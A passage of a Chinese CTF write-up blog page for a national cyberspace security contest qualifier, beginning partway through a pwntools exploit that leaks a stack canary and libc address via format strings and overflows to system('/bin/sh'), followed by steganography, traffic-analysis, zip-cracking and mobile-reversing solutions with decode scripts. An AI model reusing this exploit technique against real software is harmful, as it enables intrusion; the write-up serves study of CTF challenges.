class="string">&quot;you?\n&quot;</span>)</span><br><span class="line">    payload = <span class="string">&quot;aa&quot;</span> + p32(addr) + <span class="string">&quot;%5$s&quot;</span></span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;login!aa&quot;</span>)</span><br><span class="line">    r.recv(<span class="number">4</span>)</span><br><span class="line">    data = r.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    data = data.replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_canary</span>():</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;you?\n&quot;</span>)</span><br><span class="line">    payload = <span class="string">&quot;%7$p&quot;</span></span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;login!&quot;</span>)</span><br><span class="line">    data = r.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    data = data.replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">canary = int(leak_canary(),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;[*] canary:&#123;0&#125;&quot;</span>.format(hex(canary))</span><br><span class="line"></span><br><span class="line">printf_got = <span class="number">0x0804B010</span></span><br><span class="line">leak_data = leak(printf_got)</span><br><span class="line">printf_addr = u32(leak_data[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">fflush_addr = u32(leak_data[<span class="number">4</span>:<span class="number">8</span>])</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;[*] printf:&#123;0&#125;&quot;</span>.format(hex(printf_addr))</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;[*] fflush:&#123;0&#125;&quot;</span>.format(hex(fflush_addr))</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">libc_base = printf_addr - libc.symbols[<span class="string">&quot;printf&quot;</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">sh_addr = next(libc.search(<span class="string">&quot;/bin/sh&quot;</span>)) + libc_base</span><br><span class="line"><span class="comment">#attach()</span></span><br><span class="line">r.recvuntil(<span class="string">&quot;you?\n&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;admin2017&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;commands.&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;add&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;APP/Site: &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;a&quot;</span>*<span class="number">0x31</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Username: &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;b&quot;</span>*<span class="number">0x1d</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Password: &quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">30</span></span><br><span class="line">payload += p32(canary)</span><br><span class="line">payload += <span class="string">&quot;a&quot;</span>*<span class="number">0xc</span></span><br><span class="line">payload += p32(system_addr)</span><br><span class="line">payload += p32(sh_addr)</span><br><span class="line">payload += p32(sh_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="Misc1-一维码"><a href="#Misc1-一维码" class="headerlink" title="Misc1 一维码"></a>Misc1 一维码</h1><p>首先，从图片中进行 <code>LSB</code> 提取，能获取一个 <code>ELF</code> 文件。</p>
+<p><img src="http://oayoilchh.bkt.clouddn.com/17-4-16/76519164-file_1492348397533_13ebf.png"></p>
+<p>又因为之前扫码得知一个针对可执行文件的隐写工具hydan，通过这个就能得到flag了。</p>
+<h1 id="Misc3乾坤"><a href="#Misc3乾坤" class="headerlink" title="Misc3乾坤"></a>Misc3乾坤</h1><p>在数据包导出http对象，里面有2个zip包（在linux下可以看得清楚），解压后一个是flag.exe另一个是encode.py，encode.py是把flag进行多次b64替换并做处理，而flag.exe在最后面附带了密文，编写decode.py即可</p>
+<p><code>flag&#123;n1_hEn_baNg_0&#125;</code></p>
+<h1 id="Misc4-轨迹"><a href="#Misc4-轨迹" class="headerlink" title="Misc4 轨迹"></a>Misc4 轨迹</h1><p>USB流量捕获与解析，之前在360安全客看到过类似的题目，我记得好像还是XNUCA Misc专场的题。猜测又是画flag了，祭出我的神器！（当然也不是我的是github上的大神写的）<a href="https://github.com/gloxec/UsbMiceDataHacker">https://github.com/gloxec/UsbMiceDataHacker</a></p>
+<p><img src="http://oayoilchh.bkt.clouddn.com/17-4-16/26696594-file_1492349034373_3a9b.png"></p>
+<p>经过一番艰难的识别。。。。</p>
+<h1 id="Misc5-种棵树吧"><a href="#Misc5-种棵树吧" class="headerlink" title="Misc5 种棵树吧"></a>Misc5 种棵树吧</h1><p>对第一个图片斌walk 得到一个gif，加上头，能得到 In-order <code> &#123;RY!heHVaL-goAI&#123;dxj_GpnUw8&#125;kzu*Er:s56fFl2i&#125;</code><br>strings 第二个图片得到  Post-order<code>&#123;YR!eVa-gLAoxd_j&#123;pw&#125;8zkUnGuIHh:r65f2lFsEi*&#125;</code><br>二叉树就二叉树吗 …真是的<br>由中序和后序画出二叉树，然后按层次遍历 得到hi!HEReIsYouFLAG:flag{n52V-jPU6d_kx8zw}</p>
+<h1 id="Misc6-我们的秘密"><a href="#Misc6-我们的秘密" class="headerlink" title="Misc6 我们的秘密"></a>Misc6 我们的秘密</h1><p>对文件进行<code>binwak secret.zip -e</code>得到一个reame.txt文件，使用明文攻击，得到压缩包密码：3xatu2o17<br>解压后主要有两文件，一个音频，一个视频，音频中解摩尔斯得到CTFSECWAR2017，然后猜测题目的意思，our secret这是一款隐写软件，通过他和之前得到的字符串得到<code>flag&#123;v1de0_c0nc3a1_lala&#125;</code></p>
+<p><img src="http://oayoilchh.bkt.clouddn.com/17-4-16/34757794-file_1492350154404_4c6b.png"></p>
+<h1 id="MOBILE1-拯救鲁班七号"><a href="#MOBILE1-拯救鲁班七号" class="headerlink" title="MOBILE1 拯救鲁班七号"></a>MOBILE1 拯救鲁班七号</h1><p>题目对输入的字符串进行简单的变换，每个循环中，首先将当前index指向的相邻两个字符互换，然后将进入一个小循环依次每隔3个互换。加解密时需注意互换的边界。密文为“!S#@A4DF32511@43”，明文为“!@#@ASDF3451123”。<br>加解密代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&#x27;!@#@ASDF34511234&#x27;</span></span><br><span class="line"><span class="keyword">print</span> len(s)</span><br><span class="line">l = list(s)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, len(l) - <span class="number">1</span>, <span class="number">2</span>):</span><br><span class="line">    l[i], l[i - <span class="number">1</span>] = l[i - <span class="number">1</span>], l[i]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>, len(l), <span class="number">4</span>):</span><br><span class="line">        l[j - <span class="number">4</span>], l[j] = l[j], l[j - <span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> l</span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;&#x27;</span>.join(l)</span><br><span class="line"></span><br><span class="line"><span class="comment"># s = &#x27;S!@#@1FD23154A34&#x27;</span></span><br><span class="line"><span class="comment"># l = list(s)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(((len(l) &amp; (~<span class="number">1</span>)) - <span class="number">3</span>), <span class="number">0</span>, <span class="number">-2</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range((len(l) - <span class="number">1</span>) &amp; (~<span class="number">3</span>), <span class="number">3</span>, <span class="number">-4</span>):</span><br><span class="line">        l[j - <span class="number">4</span>], l[j] = l[j], l[j - <span class="number">4</span>]</span><br><span class="line">    l[i], l[i - <span class="number">1</span>] = l[i - <span class="number">1</span>], l[i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> l</span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;&#x27;</span>.join(l)</span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;&#x27;</span>.join(l) == s</span><br></pre></td></tr></table></figure>
+
+<h1 id="MOBILE-2-人民的名义-抓捕赵德汉1"><a href="#MOBILE-2-人民的名义-抓捕赵德汉1" class="headerlink" title="MOBILE 2 人民的名义-抓捕赵德汉1"></a>MOBILE 2 人民的名义-抓捕赵德汉1</h1><p>首先从sqlite数据库里取一个字符串，id为2，表为users，取出来字符串为9838e888496bfda98afdbb98a9b9a9d9cdfa29，然后会将输入做一些变换与字符串比较，变换的规则为每个字符的低四位取反并转为十六进制，然后加上高四位与0xe异或。</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&#x27;9838e888496bfda98afdbb98a9b9a9d9cdfa29&#x27;</span></span><br><span class="line">l = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(s), <span class="number">2</span>):</span><br><span class="line">    l.append(chr(</span><br><span class="line">        (~int(s[i], <span class="number">16</span>) &amp; <span class="number">0xf</span>) + ((int(s[i + <span class="number">1</span>], <span class="number">16</span>) ^ <span class="number">0xe</span>) &lt;&lt; <span class="number">4</span>)</span><br><span class="line">    ))</span><br><span class="line"><span class="keyword">print</span> l</span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;&#x27;</span>.join(l)</span><br></pre></td></tr></table></figure>
+<h1 id="MOBILE-3-人民的名义-抓捕赵德汉2"><a href="#MOBILE-3-人民的名义-抓捕赵德汉2" class="headerlink" title="MOBILE 3 人民的名义-抓捕赵德汉2"></a>MOBILE 3 人民的名义-抓捕赵德汉2</h1><p>这个题有两种解法，第一种反编译newClassName.class，里面有个md5：<code>fa3733c647dca53a66cf8df953c2d539</code> ，cmd5上查一下是monkey99就是flag。<br>第二种正统的做法，是反编译CheckPassword.class，发现里面动态加载了一个class，这个class使用aes加密存于ClassEnc文件中，aes密钥的十六进制是<code>bb27630cf264f8567d185008c10c3f96</code> ，把这个ClassEnc文件解密，即可得到newClassName.class文件的内容，后面的步骤同第一个解法</p>
+<h1 id="MOBILE-4-The-Marauder’s-Map"><a href="#MOBILE-4-The-Marauder’s-Map" class="headerlink" title="MOBILE 4 The Marauder’s Map"></a>MOBILE 4 The Marauder’s Map</h1><p>本题使用双字节混淆，众所周知java是支持双字节变量名的，也就是说你可以起中文的变量名，这并不影响编译，因此可以直接反编译class代码，然后直接重新编译运行就好了。<br>这个题使用的是自己的system类，因此要注意不要和系统的system类弄混了。<br>这个题首先由一个复杂的字符串每个字符右移一位生成一个密钥，然后遍历输入，计算当前索引的斐波那契数列的值，作为对密钥的索引，然后拼接起来就是目标flag。<br>这里密钥的获取只能用java来实现，其余可以用Python来实现。<br>代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getKey</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   String x = <span class="string">&quot;&quot;</span>;</span><br><span class="line">   <span class="keyword">char</span>[] var5;</span><br><span class="line">   <span class="keyword">int</span> var4 = (var5 = <span class="string">&quot;vÈ¾¤ÊÊ¬ÆÆÊvÌ¤Ê²Ê²ÀÎ¤¨¸¬&quot;</span>.toCharArray()).length;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span>(<span class="keyword">int</span> var3 = <span class="number">0</span>; var3 &lt; var4; ++var3) &#123;</span><br><span class="line">      <span class="keyword">char</span> $ = var5[var3];</span><br><span class="line">      x = x + (<span class="keyword">char</span>)(($ &gt;&gt; <span class="number">1</span>) + <span class="number">15</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">i</span>):</span></span><br><span class="line">    <span class="keyword">return</span> f(i - <span class="number">1</span>) + f(i - <span class="number">2</span>) <span class="keyword">if</span> i &gt; <span class="number">2</span> <span class="keyword">else</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">d</span>(<span class="params">i, s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> f(i) % len(s)</span><br><span class="line">key = <span class="string">&quot;JsnatterrtJuaththovacke&quot;</span></span><br><span class="line">l = []</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        l.append(key[d(i + k, key)])</span><br><span class="line">    l.append(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">    i += <span class="number">5</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;&#x27;</span>.join(l)[:<span class="number">-1</span>]</span><br></pre></td></tr></table></figure>
+
+<h1 id="MOBILE-5-取证密码"><a href="#MOBILE-5-取证密码" class="headerlink" title="MOBILE 5 取证密码"></a>MOBILE 5 取证密码</h1><p>本题lib中有一个字符串和一个整数数组，只要按整数数组里的顺序从字符串中取出字符，拼接起来就是flag<br>代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="string">&#x27;yInS567!bcNOUV8vwCDefXYZadoPQRGx13ghTpqrsHklm2EFtuJKLzMijAB094W&#x27;</span></span><br><span class="line">l = [<span class="number">0x39</span>, <span class="number">0x20</span>, <span class="number">7</span>, <span class="number">0xA</span>, <span class="number">0x20</span>, <span class="number">0x29</span>, <span class="number">0x13</span>, <span class="number">2</span>, <span class="number">0x3A</span>, <span class="number">0xC</span>, <span class="number">0x11</span>, <span class="number">0x31</span>, <span class="number">0x3B</span>, <span class="number">0xB</span>, <span class="number">7</span>]</span><br><span class="line"></span><br><span class="line">s = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">    s.append(key[i])</span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;&#x27;</span>.join(s)</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="https://bestwing.me">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/link">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/atom.xml">rss</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E7%BA%BF%E4%B8%8A%E5%88%9D%E8%B5%9B"><span class="toc-number">1.</span> <span class="toc-text">第三届全国网络空间安全技术大赛(线上初赛)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web2-%E6%8A%BD%E6%8A%BD%E5%A5%96"><span class="toc-number">2.</span> <span class="toc-text">Web2 抽抽奖</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web3-%E7%BB%A7%E7%BB%AD%E6%8A%BD"><span class="toc-number">3.</span> <span class="toc-text">Web3 继续抽</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web4-Wrong"><span class="toc-number">4.</span> <span class="toc-text">Web4  Wrong</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Crypto1-%E7%AD%BE%E5%88%B0"><span class="toc-number">5.</span> <span class="toc-text">Crypto1 签到</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Crypt2-200"><span class="toc-number">6.</span> <span class="toc-text">Crypt2 200</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Bin1-Now"><span class="toc-number">7.</span> <span class="toc-text">Bin1 Now</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Bin2-Magical-Box"><span class="toc-number">8.</span> <span class="toc-text">Bin2 Magical Box</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc1-%E4%B8%80%E7%BB%B4%E7%A0%81"><span class="toc-number">9.</span> <span class="toc-text">Misc1 一维码</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc3%E4%B9%BE%E5%9D%A4"><span class="toc-number">10.</span> <span class="toc-text">Misc3乾坤</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc4-%E8%BD%A8%E8%BF%B9"><span class="toc-number">11.</span> <span class="toc-text">Misc4 轨迹</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc5-%E7%A7%8D%E6%A3%B5%E6%A0%91%E5%90%A7"><span class="toc-number">12.</span> <span class="toc-text">Misc5 种棵树吧</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc6-%E6%88%91%E4%BB%AC%E7%9A%84%E7%A7%98%E5%AF%86"><span class="toc-number">13.</span> <span class="toc-text">Misc6 我们的秘密</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MOBILE1-%E6%8B%AF%E6%95%91%E9%B2%81%E7%8F%AD%E4%B8%83%E5%8F%B7"><span class="toc-number">14.</span> <span class="toc-text">MOBILE1 拯救鲁班七号</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MOBILE-2-%E4%BA%BA%E6%B0%91%E7%9A%84%E5%90%8D%E4%B9%89-%E6%8A%93%E6%8D%95%E8%B5%B5%E5%BE%B7%E6%B1%891"><span class="toc-number">15.</span> <span class="toc-text">MOBILE 2 人民的名义-抓捕赵德汉1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MOBILE-3-%E4%BA%BA%E6%B0%91%E7%9A%84%E5%90%8D%E4%B9%89-%E6%8A%93%E6%8D%95%E8%B5%B5%E5%BE%B7%E6%B1%892"><span class="toc-number">16.</span> <span class="toc-text">MOBILE 3 人民的名义-抓捕赵德汉2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MOBILE-4-The-Marauder%E2%80%99s-Map"><span class="toc-number">17.</span> <span class="toc-text">MOBILE 4 The Marauder’s Map</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MOBILE-5-%E5%8F%96%E8%AF%81%E5%AF%86%E7%A0%81"><span class="toc-number">18.</span> <span class="toc-text">MOBILE 5 取证密码</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://bestwing.me/cstc-xatu-writeup.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://bestwing.me/cstc-xatu-writeup.html&text=第三届全国网络空间安全技术大赛(线上初赛)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://bestwing.me/cstc-xatu-writeup.html&title=第三届全国网络空间安全技术大赛(线上初赛)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bestwing.me/cstc-xatu-writeup.html&is_video=false&description=第三届全国网络空间安全技术大赛(线上初赛)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=第三届全国网络空间安全技术大赛(线上初赛)&body=Check out this article: https://bestwing.me/cstc-xatu-writeup.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://bestwing.me/cstc-xatu-writeup.html&title=第三届全国网络空间安全技术大赛(线上初赛)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://bestwing.me/cstc-xatu-writeup.html&title=第三届全国网络空间安全技术大赛(线上初赛)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://bestwing.me/cstc-xatu-writeup.html&title=第三届全国网络空间安全技术大赛(线上初赛)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://bestwing.me/cstc-xatu-writeup.html&title=第三届全国网络空间安全技术大赛(线上初赛)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://bestwing.me/cstc-xatu-writeup.html&name=第三届全国网络空间安全技术大赛(线上初赛)&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://bestwing.me/cstc-xatu-writeup.html&t=第三届全国网络空间安全技术大赛(线上初赛)"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020
+    Swing
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="https://bestwing.me">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/link">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/atom.xml">rss</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-133464311-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Baidu Analytics -->
+
+    <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?2e6da3c375c8a87f5b664cea6d4cb29c";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'swing';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
+</body>
+</html>
